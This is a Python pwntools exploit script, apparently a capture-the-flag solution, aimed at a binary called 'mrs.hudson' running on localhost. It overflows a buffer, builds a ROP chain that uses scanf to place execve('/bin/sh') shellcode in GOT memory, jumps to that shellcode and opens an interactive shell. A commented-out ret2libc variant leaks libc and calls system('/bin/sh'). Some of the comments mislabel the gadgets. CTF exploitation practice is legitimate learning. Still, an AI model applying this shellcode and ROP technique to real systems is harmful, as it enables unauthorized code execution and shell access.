from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./mrs.hudson")
else:
    conn = remote(HOST, PORT)

elf = ELF('./mrs.hudson')

pRdi_ret = 0x004006f3 # pop rdi(0x040072b); ret
pRsi_popR15_ret = 0x004006f1 # pop rdi; ret
gotSpace = elf.got['__isoc99_scanf']+0x10
leave_ret = 0x400685
dummy = 1
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"


ROP = "A" * 120

# write(1, __libc_start_main_got, 4)
ROP += p64(pRdi_ret)
ROP += p64(0x040072b)
ROP += p64(pRsi_popR15_ret)
ROP += p64(gotSpace)
ROP += p64(dummy)
ROP += p64(elf.plt['__isoc99_scanf'])
#ROP += p64(leave_ret)
ROP += p64(gotSpace)
ROP += shellcode

gdb.attach(conn)

print conn.recv(1024)
conn.sendline(ROP)
time.sleep(0.1)

conn.interactive()

'''
# read(0, __libc_start_main_got, 20)
ROP += p32(elf.plt['read'])
ROP += p32(pop3ret)
ROP += p32(0)
ROP += p32(elf.got['__libc_start_main'])
ROP += p32(20)

# system('bin/sh')
ROP += p32(elf.plt['__libc_start_main'])
ROP += p32(0xBBBB)
ROP += p32(elf.got['__libc_start_main']+4)


print conn.recv(1024)
conn.sendline(ROP)
time.sleep(0.1)

__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel

print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/sh")
time.sleep(0.1)

conn.interactive()
'''
